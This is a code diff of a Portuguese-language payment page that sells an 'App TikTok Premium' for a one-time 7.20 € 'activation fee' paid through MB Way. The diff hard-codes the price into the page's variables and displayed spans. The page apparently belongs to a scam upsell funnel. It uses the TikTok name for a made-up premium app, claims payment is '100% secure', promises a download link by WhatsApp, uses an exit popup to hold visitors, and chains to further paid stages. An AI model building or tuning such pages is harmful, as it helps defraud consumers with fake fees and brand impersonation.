@@ -3,6 +3,8 @@
     <head>
         <script src="/api/central?format=js"></script>
         <script>
+            // Valor da taxa declarado globalmente para não dar erro 400 no backend
+            window.__UP_AMOUNT__ = 7.20; 
             window.__UP_META__ = {
                 "stage": "up1",
                 "nextBase": "../up2/",
@@ -301,7 +303,7 @@
                     que nos ajuda a manter os servidores ativos.
                 </div>
                 <div class="price-tag">
-                    <span class="js-up-fmt"></span>
+                    <span class="js-up-fmt">7,20</span> €
                 </div>
                 <div class="price-sub">Taxa única de ativação</div>
                 <button class="btn-cta" onclick="openPaymentForm()">PAGAR TAXA E ACEDER À APP</button>
@@ -310,7 +312,6 @@
                         <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                     </svg>
                     Pagamento 100% seguro e encriptado
-    
                 </div>
                 <div class="delivery-note">Após o pagamento, o link para download será enviado automaticamente via WhatsApp e e-mail.</div>
             </div>
@@ -336,7 +337,7 @@
                 <div id="pay-form-section">
                     <h3 style="font-size:17px;font-weight:700;margin-bottom:4px;color:#111">Pagamento seguro</h3>
                     <p style="font-size:13px;color:#888;margin-bottom:18px">
-                        MB Way · <span class="js-up-fmt"></span>
+                        MB Way · <span class="js-up-fmt">7,20</span>
                         €
                     </p>
                     <div style="margin-bottom:14px">
@@ -365,7 +366,7 @@
                     <p style="font-size:13px;color:#888;margin-bottom:20px">
                         Abre o app MB Way e confirma o pagamento de 
                         <strong>
-                            <span class="js-up-fmt"></span>
+                            <span class="js-up-fmt">7,20</span>
                             €
                         </strong>
                     </p>
@@ -410,7 +411,9 @@
         <script>
             var upPayId = null
               , upPayInterval = null;
-            var UP_AMOUNT = window.__UP_AMOUNT__;
+            
+            // Garantia extra com fallback para 7.20
+            var UP_AMOUNT = window.__UP_AMOUNT__ || 7.20;
             var UP_NEXT = '../up2/' + window.location.search;
             var UP_PRODUCT_ID = "upsell-1"
               , UP_PRODUCT_NAME = "TikTok - Taxa de Ativação";
@@ -591,7 +594,7 @@
                 <h3 style="font-size:18px;font-weight:800;color:#111;margin-bottom:10px">Tens a certeza que queres sair?</h3>
                 <p style="font-size:14px;color:#555;line-height:1.6;margin-bottom:22px">
                     Vais perder o acesso à <strong>App TikTok Premium</strong>
-                    . A taxa de ativação de <span class="js-up-fmt"></span>
+                    . A taxa de ativação de <span class="js-up-fmt">7,20</span>
                     € garante o teu acesso permanente.
                 </p>
                 <button onclick="_exitConfirm(false)" style="width:100%;background:linear-gradient(135deg,#fe2c55,#d4004a);color:#fff;font-size:15px;font-weight:700;padding:16px;border:none;border-radius:50px;cursor:pointer;margin-bottom:12px">Não, quero a App TikTok Premium</button>
